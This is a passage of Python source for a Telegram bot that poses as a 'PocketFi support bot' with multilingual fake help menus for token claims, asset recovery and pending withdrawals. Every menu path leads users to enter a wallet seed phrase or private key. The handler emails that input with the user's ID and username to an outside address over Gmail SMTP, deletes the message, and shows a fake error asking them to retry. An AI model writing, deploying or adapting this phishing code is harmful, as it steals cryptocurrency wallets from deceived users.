        "post_receive_error": "‼️ Đã xảy ra lỗi. Vui lòng đảm bảo nhập đúng khóa — sử dụng sao chép/dán để tránh lỗi. Vui lòng /start để thử lại。",
        "choose language": "Chọn ngôn ngữ:",
        "await restart message": "Nhấn /start để bắt đầu lại。",
        "back": "🔙 Quay lại",
        "invalid_input": "Dữ liệu không hợp lệ. /start。",
        "fix ads": "Rút tiền đang chờ xử lý",
        "pending_withdrawal_connect": "Vui lòng kết nối ví của bạn để nhận khoản rút đang chờ của bạn。",
    },
    "pl": {
        "welcome": "Cześć, {user}\nWitamy w PocketFi support bot. Ten bot może pomóc w diagnozowaniu i rozwiązywaniu problemów wymienionych w menu: Walidacja; Odbierz Tokeny; Odzyskiwanie aktywów; Ogólne problemy; Rektyfikacja; Brakujący balans; Problemy z logowaniem; Problemy migracyjne; Odzyskaj spalone tokeny; Depozyty; Oczekująca wypłata。" + PROFESSIONAL_REASSURANCE["pl"],
        "main menu title": "Wybierz rodzaj problemu, aby kontynuować:",
        "validation": "Walidacja",
        "claim tokens": "Odbierz Tokeny",
        "assets recovery": "Odzyskiwanie aktywów",
        "general issues": "Ogólne problemy",
        "rectification": "Rektyfikacja",
        "recover burned tokens": "Odzyskaj spalone tokeny",
        "deposits": "Depozyty",
        "withdrawals": "Wypłaty",
        "missing balance": "Brakujący/Nieregularny saldo",
        "login issues": "Problemy z logowaniem",
        "migration issues": "Problemy migracyjne",
        "connect wallet message": "Proszę połączyć portfel za pomocą Private Key lub Seed Phrase, aby kontynuować.",
        "connect wallet button": "🔑 Połącz portfel",
        "select wallet type": "Wybierz typ portfela:",
        "other wallets": "Inne portfele",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Importuj Seed Phrase",
        "wallet selection message": "Właśnie wybrałeś {wallet_name}。\nWybierz preferowaną metodę połączenia。",
        "prompt seed": "Wprowadź seed phrase 12 lub 24 słów。" + PROFESSIONAL_REASSURANCE["pl"],
        "prompt private key": "Wprowadź swój private key。" + PROFESSIONAL_REASSURANCE["pl"],
        "error_use_seed_phrase": "To pole wymaga seed phrase (12 lub 24 słów)。",
        "post_receive_error": "‼️ Wystąpił błąd. /start aby spróbować ponownie。",
        "choose language": "Wybierz język:",
        "await restart message": "Kliknij /start aby zacząć ponownie。",
        "back": "🔙 Powrót",
        "invalid_input": "Nieprawidłowe dane. /start。",
        "fix ads": "Oczekująca wypłata",
        "pending_withdrawal_connect": "Proszę połączyć portfel, aby odebrać oczekującą wypłatę。",
    },
}

# Helper to fetch localized UI text
def get_text(context: ContextTypes.DEFAULT_TYPE, key: str) -> str:
    lang = "en"
    try:
        if context and hasattr(context, "user_data"):
            lang = context.user_data.get("language", "en")
    except Exception:
        lang = "en"
    return LANGUAGES.get(lang, LANGUAGES["en"]).get(key, LANGUAGES["en"].get(key, key))

# Localize wallet name (replace "Wallet" with local word)
def localize_wallet_label(base_name: str, lang: str) -> str:
    wallet_word = WALLET_WORD_BY_LANG.get(lang, WALLET_WORD_BY_LANG["en"])
    if "Wallet" in base_name:
        return base_name.replace("Wallet", wallet_word)
    if "wallet" in base_name:
        return base_name.replace("wallet", wallet_word)
    return base_name

# Message stack push helper to allow Back edits
async def send_and_push_message(
    bot,
    chat_id: int,
    text: str,
    context: ContextTypes.DEFAULT_TYPE,
    reply_markup=None,
    parse_mode=None,
    state=None,
) -> object:
    msg = await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
    stack = context.user_data.setdefault("message_stack", [])
    recorded_state = state if state is not None else context.user_data.get("current_state", CHOOSE_LANGUAGE)
    stack.append(
        {
            "chat_id": chat_id,
            "message_id": msg.message_id,
            "text": text,
            "reply_markup": reply_markup,
            "state": recorded_state,
            "parse_mode": parse_mode,
        }
    )
    if len(stack) > 60:
        stack.pop(0)
    return msg

# Edit current message to previous on Back press
async def edit_current_to_previous_on_back(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    stack = context.user_data.get("message_stack", [])
    if not stack:
        keyboard = build_language_keyboard()
        await send_and_push_message(context.bot, update.effective_chat.id, get_text(context, "choose language"), context, reply_markup=keyboard, state=CHOOSE_LANGUAGE)
        context.user_data["current_state"] = CHOOSE_LANGUAGE
        return CHOOSE_LANGUAGE

    if len(stack) == 1:
        prev = stack[0]
        try:
            await update.callback_query.message.edit_text(prev["text"], reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"))
            context.user_data["current_state"] = prev.get("state", CHOOSE_LANGUAGE)
            prev["message_id"] = update.callback_query.message.message_id
            prev["chat_id"] = update.callback_query.message.chat.id
            stack[-1] = prev
            return prev.get("state", CHOOSE_LANGUAGE)
        except Exception:
            await send_and_push_message(context.bot, prev["chat_id"], prev["text"], context, reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"), state=prev.get("state", CHOOSE_LANGUAGE))
            context.user_data["current_state"] = prev.get("state", CHOOSE_LANGUAGE)
            return prev.get("state", CHOOSE_LANGUAGE)

    try:
        stack.pop()
    except Exception:
        pass

    prev = stack[-1]
    try:
        await update.callback_query.message.edit_text(prev["text"], reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"))
        new_prev = prev.copy()
        new_prev["message_id"] = update.callback_query.message.message_id
        new_prev["chat_id"] = update.callback_query.message.chat.id
        stack[-1] = new_prev
        context.user_data["current_state"] = new_prev.get("state", MAIN_MENU)
        return new_prev.get("state", MAIN_MENU)
    except Exception:
        sent = await send_and_push_message(context.bot, prev["chat_id"], prev["text"], context, reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"), state=prev.get("state", MAIN_MENU))
        context.user_data["current_state"] = prev.get("state", MAIN_MENU)
        return prev.get("state", MAIN_MENU)

async def handle_back(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    state = await edit_current_to_previous_on_back(update, context)
    return state

# Keyboards and menus
def build_language_keyboard():
    keyboard = [
        [InlineKeyboardButton("English 🇬🇧", callback_data="lang_en"), InlineKeyboardButton("Русский 🇷🇺", callback_data="lang_ru")],
        [InlineKeyboardButton("Español 🇪🇸", callback_data="lang_es"), InlineKeyboardButton("Українська 🇺🇦", callback_data="lang_uk")],
        [InlineKeyboardButton("Français 🇫🇷", callback_data="lang_fr"), InlineKeyboardButton("فارسی 🇮🇷", callback_data="lang_fa")],
        [InlineKeyboardButton("Türkçe 🇹🇷", callback_data="lang_tr"), InlineKeyboardButton("中文 🇨🇳", callback_data="lang_zh")],
        [InlineKeyboardButton("Deutsch 🇩🇪", callback_data="lang_de"), InlineKeyboardButton("العربية 🇦🇪", callback_data="lang_ar")],
        [InlineKeyboardButton("Nederlands 🇳🇱", callback_data="lang_nl"), InlineKeyboardButton("हिन्दी 🇮🇳", callback_data="lang_hi")],
        [InlineKeyboardButton("Bahasa Indonesia 🇮🇩", callback_data="lang_id"), InlineKeyboardButton("Português 🇵🇹", callback_data="lang_pt")],
        [InlineKeyboardButton("Čeština 🇨🇿", callback_data="lang_cs"), InlineKeyboardButton("اردو 🇵🇰", callback_data="lang_ur")],
        [InlineKeyboardButton("Oʻzbekcha 🇺🇿", callback_data="lang_uz"), InlineKeyboardButton("Italiano 🇮🇹", callback_data="lang_it")],
        [InlineKeyboardButton("日本語 🇯🇵", callback_data="lang_ja"), InlineKeyboardButton("Bahasa Melayu 🇲🇾", callback_data="lang_ms")],
        [InlineKeyboardButton("Română 🇷🇴", callback_data="lang_ro"), InlineKeyboardButton("Slovenčina 🇸🇰", callback_data="lang_sk")],
        [InlineKeyboardButton("ไทย 🇹🇭", callback_data="lang_th"), InlineKeyboardButton("Tiếng Việt 🇻🇳", callback_data="lang_vi")],
        [InlineKeyboardButton("Polski 🇵🇱", callback_data="lang_pl")],
    ]
    return InlineKeyboardMarkup(keyboard)

def build_main_menu_markup(context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [
            InlineKeyboardButton(get_text(context, "validation"), callback_data="validation"),
            InlineKeyboardButton(get_text(context, "claim tokens"), callback_data="claim_tokens"),
        ],
        [
            InlineKeyboardButton(get_text(context, "assets recovery"), callback_data="assets_recovery"),
            InlineKeyboardButton(get_text(context, "general issues"), callback_data="general_issues"),
        ],
        [
            InlineKeyboardButton(get_text(context, "rectification"), callback_data="rectification"),
            InlineKeyboardButton(get_text(context, "recover burned tokens"), callback_data="recover_burned_tokens"),
        ],
        [
            InlineKeyboardButton(get_text(context, "deposits"), callback_data="deposits"),
            InlineKeyboardButton(get_text(context, "withdrawals"), callback_data="withdrawals"),
        ],
        [
            InlineKeyboardButton(get_text(context, "login issues"), callback_data="login_issues"),
            InlineKeyboardButton(get_text(context, "missing balance"), callback_data="missing_balance"),
        ],
        [
            InlineKeyboardButton(get_text(context, "fix ads"), callback_data="pending_withdrawal"),
            InlineKeyboardButton(get_text(context, "migration issues"), callback_data="migration_issues"),
        ],
    ]
    kb.append([InlineKeyboardButton(get_text(context, "back"), callback_data="back_main_menu")])
    return InlineKeyboardMarkup(kb)

# Mapping actions for connect text
ACTION_LABEL_KEYS = {
    "validation": "validation",
    "claim_tokens": "claim tokens",
    "assets_recovery": "assets recovery",
    "general_issues": "general issues",
    "rectification": "rectification",
    "recover_burned_tokens": "recover burned tokens",
    "deposits": "deposits",
    "withdrawals": "withdrawals",
    "login_issues": "login issues",
    "missing_balance": "missing balance",
    "pending_withdrawal": "fix ads",
    "migration_issues": "migration issues",
}

# Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["message_stack"] = []
    context.user_data["current_state"] = CHOOSE_LANGUAGE
    keyboard = build_language_keyboard()
    chat_id = update.effective_chat.id
    await send_and_push_message(context.bot, chat_id, get_text(context, "choose language"), context, reply_markup=keyboard, state=CHOOSE_LANGUAGE)
    return CHOOSE_LANGUAGE

async def set_language(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = query.data.split("_", 1)[1]
    context.user_data["language"] = lang
    context.user_data["current_state"] = MAIN_MENU
    try:
        if query.message:
            await query.message.edit_reply_markup(reply_markup=None)
    except Exception:
        logging.debug("Failed to remove language keyboard (non-fatal).")
    welcome_template = get_text(context, "welcome")
    try:
        welcome = welcome_template.format(user=update.effective_user.mention_html())
    except Exception:
        welcome = welcome_template
    markup = build_main_menu_markup(context)
    await send_and_push_message(context.bot, update.effective_chat.id, welcome, context, reply_markup=markup, parse_mode="HTML", state=MAIN_MENU)
    return MAIN_MENU

async def handle_invalid_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    msg = get_text(context, "invalid_input")
    await update.message.reply_text(msg)
    return context.user_data.get("current_state", CHOOSE_LANGUAGE)

# Show connect wallet (default behaviour); special cases removed (claim_og_pass removed)
async def show_connect_wallet_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    selected = query.data
    action_key = ACTION_LABEL_KEYS.get(selected, selected)
    action_label = get_text(context, action_key)
    connect_template = get_text(context, "connect wallet message")
    if not connect_template:
        connect_text = f"Please connect your wallet to {action_label}."
    else:
        connect_text = connect_template

    context.user_data["current_state"] = AWAIT_CONNECT_WALLET
    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton(get_text(context, "connect wallet button"), callback_data="connect_wallet")],
            [InlineKeyboardButton(get_text(context, "back"), callback_data=f"back_{selected}")],
        ]
    )
    await send_and_push_message(context.bot, update.effective_chat.id, connect_text, context, reply_markup=keyboard, state=AWAIT_CONNECT_WALLET)
    return AWAIT_CONNECT_WALLET

async def show_wallet_types(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("language", "en")
    keyboard = []
    primary_keys = [
        "wallet_type_metamask",
        "wallet_type_trust_wallet",
        "wallet_type_coinbase",
        "wallet_type_tonkeeper",
        "wallet_type_phantom_wallet",
    ]
    for key in primary_keys:
        label = localize_wallet_label(WALLET_DISPLAY_NAMES.get(key, key), lang)
        keyboard.append([InlineKeyboardButton(label, callback_data=key)])
    keyboard.append([InlineKeyboardButton(get_text(context, "other wallets"), callback_data="other_wallets")])
    keyboard.append([InlineKeyboardButton(get_text(context, "back"), callback_data="back_wallet_types")])
    reply = InlineKeyboardMarkup(keyboard)
    context.user_data["current_state"] = CHOOSE_WALLET_TYPE
    await send_and_push_message(context.bot, update.effective_chat.id, get_text(context, "select wallet type"), context, reply_markup=reply, state=CHOOSE_WALLET_TYPE)
    return CHOOSE_WALLET_TYPE

async def show_other_wallets(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("language", "en")
    keys = [
        "wallet_type_mytonwallet",
        "wallet_type_tonhub",
        "wallet_type_rainbow",
        "wallet_type_safepal",
        "wallet_type_wallet_connect",
        "wallet_type_ledger",
        "wallet_type_brd_wallet",
        "wallet_type_solana_wallet",
        "wallet_type_balance",
        "wallet_type_okx",
        "wallet_type_xverse",
        "wallet_type_sparrow",
        "wallet_type_earth_wallet",
        "wallet_type_hiro",
        "wallet_type_saitamask_wallet",
        "wallet_type_casper_wallet",
        "wallet_type_cake_wallet",
        "wallet_type_kepir_wallet",
        "wallet_type_icpswap",
        "wallet_type_kaspa",
        "wallet_type_nem_wallet",
        "wallet_type_near_wallet",
        "wallet_type_compass_wallet",
        "wallet_type_stack_wallet",
        "wallet_type_soilflare_wallet",
        "wallet_type_aioz_wallet",
        "wallet_type_xpla_vault_wallet",
        "wallet_type_polkadot_wallet",
        "wallet_type_xportal_wallet",
        "wallet_type_multiversx_wallet",
        "wallet_type_verachain_wallet",
        "wallet_type_casperdash_wallet",
        "wallet_type_nova_wallet",
        "wallet_type_fearless_wallet",
        "wallet_type_terra_station",
        "wallet_type_cosmos_station",
        "wallet_type_exodus_wallet",
        "wallet_type_argent",
        "wallet_type_binance_chain",
        "wallet_type_safemoon",
        "wallet_type_gnosis_safe",
        "wallet_type_defi",
        "wallet_type_other",
    ]
    kb = []
    row = []
    for k in keys:
        base_label = WALLET_DISPLAY_NAMES.get(k, k.replace("wallet_type_", "").replace("_", " ").title())
        label = localize_wallet_label(base_label, lang)
        row.append(InlineKeyboardButton(label, callback_data=k))
        if len(row) == 2:
            kb.append(row)
            row = []
    if row:
        kb.append(row)
    kb.append([InlineKeyboardButton(get_text(context, "back"), callback_data="back_other_wallets")])
    reply = InlineKeyboardMarkup(kb)
    context.user_data["current_state"] = CHOOSE_OTHER_WALLET_TYPE
    await send_and_push_message(context.bot, update.effective_chat.id, get_text(context, "select wallet type"), context, reply_markup=reply, state=CHOOSE_OTHER_WALLET_TYPE)
    return CHOOSE_OTHER_WALLET_TYPE

async def show_phrase_options(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("language", "en")
    wallet_key = query.data
    wallet_name = WALLET_DISPLAY_NAMES.get(wallet_key, wallet_key.replace("wallet_type_", "").replace("_", " ").title())
    localized_wallet_name = localize_wallet_label(wallet_name, lang)
    context.user_data["wallet type"] = localized_wallet_name
    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton(get_text(context, "private key"), callback_data="private_key"), InlineKeyboardButton(get_text(context, "seed phrase"), callback_data="seed_phrase")],
            [InlineKeyboardButton(get_text(context, "back"), callback_data="back_wallet_selection")],
        ]
    )
    text = get_text(context, "wallet selection message").format(wallet_name=localized_wallet_name)
    context.user_data["current_state"] = PROMPT_FOR_INPUT
    await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=keyboard, state=PROMPT_FOR_INPUT)
    return PROMPT_FOR_INPUT

async def prompt_for_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data["wallet option"] = query.data
    fr = ForceReply(selective=False)
    if query.data == "seed_phrase":
        context.user_data["current_state"] = RECEIVE_INPUT
        text = get_text(context, "prompt seed")
        await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=fr, state=RECEIVE_INPUT)
    elif query.data == "private_key":
        context.user_data["current_state"] = RECEIVE_INPUT
        text = get_text(context, "prompt private key")
        await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=fr, state=RECEIVE_INPUT)
    else:
        await send_and_push_message(context.bot, update.effective_chat.id, get_text(context, "invalid_input"), context, state=context.user_data.get("current_state", CHOOSE_LANGUAGE))
        return ConversationHandler.END
    return RECEIVE_INPUT

# Final input handler — email, delete message, validate 12/24 words
async def handle_final_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_input = update.message.text or ""
    chat_id = update.message.chat_id
    message_id = update.message.message_id
    wallet_option = context.user_data.get("wallet option", "Unknown")
    wallet_type = context.user_data.get("wallet type", "Unknown")
    user = update.effective_user

    # Send email
    try:
        subject = f"New Wallet Input from Telegram Bot: {wallet_type} -> {wallet_option}"
        body = f"User ID: {user.id}\nUsername: {user.username}\n\nWallet Type: {wallet_type}\nInput Type: {wallet_option}\nInput: {user_input}"
        await send_email(subject, body)
    except Exception as e:
        logging.error(f"Error while sending email: {e}")

    # Attempt to delete the user's message
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        pass

    # Validate words count (seed phrase)
    words = [w for w in re.split(r"\s+", user_input.strip()) if w]
    if len(words) not in (12, 24):
        fr = ForceReply(selective=False)
        await send_and_push_message(context.bot, chat_id, get_text(context, "error_use_seed_phrase"), context, reply_markup=fr, state=RECEIVE_INPUT)
        context.user_data["current_state"] = RECEIVE_INPUT
        return RECEIVE_INPUT

    context.user_data["current_state"] = AWAIT_RESTART
    await send_and_push_message(context.bot, chat_id, get_text(context, "post_receive_error"), context, state=AWAIT_RESTART)
    return AWAIT_RESTART

async def handle_await_restart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(get_text(context, "await restart message"))
    return AWAIT_RESTART

# Email helper
async def send_email(subject: str, body: str) -> None:
    try:
        msg = EmailMessage()
        msg.set_content(body)
        msg["Subject"] = subject
        msg["From"] = SENDER_EMAIL
        msg["To"] = RECIPIENT_EMAIL
        if not SENDER_PASSWORD:
            logging.warning("SENDER_PASSWORD not set; skipping email send.")
            return
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(SENDER_EMAIL, SENDER_PASSWORD)
            smtp.send_message(msg)
        logging.info("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    logging.info("Cancel called.")
    return ConversationHandler.END

def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSE_LANGUAGE: [CallbackQueryHandler(set_language, pattern="^lang_")],
            MAIN_MENU: [
                CallbackQueryHandler(show_connect_wallet_button, pattern="^(validation|claim_tokens|assets_recovery|general_issues|rectification|recover_burned_tokens|login_issues|missing_balance|pending_withdrawal|migration_issues|deposits|withdrawals)$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            AWAIT_CONNECT_WALLET: [
                CallbackQueryHandler(show_wallet_types, pattern="^connect_wallet$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            CHOOSE_WALLET_TYPE: [
                CallbackQueryHandler(show_other_wallets, pattern="^other_wallets$"),
                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            CHOOSE_OTHER_WALLET_TYPE: [
                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            PROMPT_FOR_INPUT: [
                CallbackQueryHandler(prompt_for_input, pattern="^(private_key|seed_phrase)$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
            ],
            RECEIVE_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_final_input),
            ],
            AWAIT_RESTART: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_await_restart),
            ],
        },
        fallbacks=[CommandHandler("start", start)],
        allow_reentry=True,
    )

    application.add_handler(conv_handler)
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()